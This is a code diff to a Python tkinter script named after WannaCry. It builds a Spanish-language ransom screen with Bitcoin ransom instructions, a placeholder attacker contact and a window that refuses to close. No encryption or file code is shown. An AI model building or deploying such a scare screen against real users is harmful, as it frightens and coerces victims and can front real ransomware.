@@ -24,8 +24,16 @@ class WannaCry:
         self.label = ttk.Label(root, text="¡Tus archivos están siendo encriptados!\n¡No cierres esta ventana!", foreground="#FF0000", font=("Arial", 12, "bold"), background='#0F1626')
         self.label.pack(pady=10)
 
-        self.stop_button = ttk.Button(root, text="Detener Encriptación", command=self.stop_encryption)
-        self.stop_button.pack(pady=5)
+        self.menu_bar = tk.Menu(root)
+        self.root.config(menu=self.menu_bar)
+
+        self.file_menu = tk.Menu(self.menu_bar, tearoff=0)
+        self.file_menu.add_command(label="¿Cómo puedo recuperar mis archivos?", command=self.recover_files)
+        self.file_menu.add_command(label="Contactar al atacante", command=self.contact_attacker)
+        self.file_menu.add_separator()
+        self.file_menu.add_command(label="Eliminar archivos cifrados", command=self.delete_encrypted_files)
+        self.file_menu.add_command(label="Acerca de WannaCry", command=self.about_wannacry)
+        self.menu_bar.add_cascade(label="Información", menu=self.file_menu)
 
         self.encrypting = True
         self.timer_thread = threading.Thread(target=self.timer)
@@ -41,11 +49,21 @@ class WannaCry:
             self.label.config(text=f"¡Tus archivos están siendo encriptados!\nTiempo transcurrido: {int(elapsed_time)} segundos")
             time.sleep(1)
 
-    def stop_encryption(self):
-        self.encrypting = False
-        self.label.config(text="¡Encriptación detenida!\nTus archivos están a salvo... por ahora.")
-        self.stop_button.config(state="disabled")
-        logging.info("Encryption stopped.")
+    def recover_files(self):
+        messagebox.showinfo("Recuperación de Archivos", "Para recuperar tus archivos, debes pagar el rescate en Bitcoin.")
+        logging.info("User asked for file recovery information.")
+
+    def contact_attacker(self):
+        messagebox.showinfo("Contactar al Atacante", "Puedes contactar al atacante a través de la dirección de correo electrónico: attacker@example.com")
+        logging.info("User asked for contacting the attacker.")
+
+    def delete_encrypted_files(self):
+        messagebox.showinfo("Eliminar Archivos Cifrados", "Eliminar los archivos cifrados podría resultar en pérdida permanente de datos. ¿Estás seguro?")
+        logging.info("User asked for deleting encrypted files.")
+
+    def about_wannacry(self):
+        messagebox.showinfo("Acerca de WannaCry", "WannaCry es un ransomware que encripta tus archivos y solicita un rescate en Bitcoin para recuperarlos.")
+        logging.info("User asked for information about WannaCry.")
 
 def disable_close_button():
     messagebox.showinfo("No se puede cancelar", "¡Tus archivos están siendo encriptados! ¡No puedes cerrar esta ventana!")
